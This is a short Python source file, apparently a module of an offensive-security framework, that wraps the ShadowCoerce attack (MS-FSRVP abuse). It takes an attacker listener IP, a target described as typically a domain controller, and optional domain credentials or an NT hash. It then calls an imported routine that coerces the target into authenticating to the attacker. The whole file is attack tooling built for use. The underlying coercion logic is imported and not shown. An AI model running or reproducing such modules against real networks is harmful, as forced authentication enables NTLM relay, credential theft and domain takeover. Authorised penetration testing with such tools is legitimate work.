import asyncio

from tool import Tool
from module import BaseModule

class ShadowCoerce(BaseModule):
    path = "coercion/shadowcoerce"
    description = "MS-FSRVP abuse (ShadowCoerce)"
    options = {
        "listen_ip": {"default": "", "description": "Listener (attacker) IP", "required": True},
        "target": {"default": "", "description": "Coercion target (typically DC)", "required": True},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": False},
        "username": {"default": "", "description": "Auth: Username", "required": False},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def _run(self, listen_ip, target, sleep, pane):

        self.opts.auth = "ntlm"

        await asyncio.sleep(sleep)

        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return
        tool.set_output_pane(pane)
        await tool.shadowcoerce(listen_ip, target)

    async def run(self, sleep=1):
        if not self.validate_options():
            return
        
        await self._run(self.opts.listen_ip, self.opts.target, sleep, self.pane_c)
